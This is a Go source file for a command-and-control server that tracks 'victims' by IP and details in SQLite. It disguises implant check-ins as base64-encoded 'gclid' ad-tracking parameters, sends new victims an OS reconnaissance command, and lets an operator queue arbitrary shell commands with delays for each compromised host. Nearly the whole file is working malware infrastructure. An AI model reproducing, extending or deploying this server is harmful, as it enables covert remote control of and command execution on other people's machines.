package main

import (
	"os"
	"log"
	"fmt"
	"strings"
	"net/http"
	"database/sql"
  "encoding/json"
	"html/template"
	"encoding/base64"
	_ "github.com/mattn/go-sqlite3"
)

var db *sql.DB
var err error

type VictimsResponse struct {
  Uid int
  Details string
  Ip string
}


type ValueResponse struct {
  All string
}

func errorStatment(err error) {
	if err != nil {
                log.Fatal("error:", err)
        }
}

func saveResponse(x []byte) bool{
  var uid string
	value := strings.Split(string(x), "==")
	fmt.Printf("Valor: %s\n", value)
	err = db.QueryRow("SELECT uid FROM victims WHERE uid = ?", strings.Split(string(value[0]), ";")[1]).Scan(&uid)
	fmt.Print(err)
	if err != nil {
    // Create
		// detais==ip
		addVictim, err := db.Prepare("INSERT INTO victims (details, ip, created) VALUES (?, ?, datetime('now', 'localtime'))")
		addVictim.Exec(value[0], value[1])
		fmt.Print("New vicitm: %s\n", addVictim)
		errorStatment(err)
		return true
	} else {
    // Update FIX IT
    // command id (of command);user id==respose==status
		status, err := db.Prepare("UPDATE command SET response = ?, status = ? WHERE id = ?")
    status.Exec(value[1], value[2], strings.Split(string(value[0]), ";")[0])
    errorStatment(err)
    status.Close()
		return false
	}
}

func queryCommand(x []byte) [3]string{
  // command id;user id==...
  uid := strings.Split(string(strings.Split(string(x), "==")[0]), ";")[1]
  var response [3]string
  rows, err := db.Query("SELECT id, run, sleep FROM command WHERE uid = ? AND status IS NULL", uid)
  errorStatment(err)

  for rows.Next() {
    err = rows.Scan(&response[0], &response[1], &response[2])
    errorStatment(err)

  }
  return response
}

func addCommand(w http.ResponseWriter, r *http.Request){
  // POST: uid, run, sleep
  uid := r.FormValue("uid")
  run := r.FormValue("run")
  sleep := r.FormValue("sleep")
  // Create
  // uid==command==time of response
  add, err := db.Prepare("INSERT INTO command (uid, run, sleep, response, status) VALUES(?, ?, ?, NULL, NULL)")
  errorStatment(err)
  add.Exec(uid, run, sleep)
  w.WriteHeader(http.StatusCreated)
  add.Close()
  fmt.Printf("----\ncommand: %s\nuid: %s\nsleep: %s", run, uid, sleep)
}

func pageAPI(w http.ResponseWriter, r *http.Request) {
  rows, err := db.Query("SELECT uid, details, ip from victims ORDER BY uid DESC");
  errorStatment(err)

  var response []*VictimsResponse

  for rows.Next() {
    value := new(VictimsResponse)
    err = rows.Scan(&value.Uid, &value.Details, &value.Ip)
    errorStatment(err)

    response = append(response, value)
  }
  w.Header().Set("Content-Type", "application/json; charset=UTF-8")
  if err := json.NewEncoder(w).Encode(response); err != nil {
    panic(err)
  }

  rows.Close()
}

func proccessData(w http.ResponseWriter, r *http.Request) {
  var command string // Command to running
  var number string // If is new sending id or if was recorded send time delay to next request
	value, err := base64.StdEncoding.DecodeString(string(r.URL.Query()["gclid"][0]))
	errorStatment(err)

  if saveResponse(value) {
    // Record
    err = db.QueryRow("SELECT uid FROM victims ORDER BY uid DESC LIMIT 1").Scan(&number)
    command = "grep 'PRETTY_NAME' /etc/os-release"
  } else {
    // Found: query [0]=>id, [1]=> command, [2]=> delay
    query := queryCommand(value)
    command = query[1]
    number = fmt.Sprintf("%s;%s", query[2], query[0])
    fmt.Printf(command)
  }
  // command==number(delay or uid)
  all := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s==%v", command, number)))

  response := ValueResponse{All: all}
	tmpl := template.Must(template.ParseFiles(os.Args[1]))
	tmpl.Execute(w, response)
 }

func main() {
	db, err = sql.Open("sqlite3", "./database/data.db")
	errorStatment(err)

  http.HandleFunc("/", proccessData)
	http.HandleFunc("/victim", pageAPI)
  http.HandleFunc("/command", addCommand)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
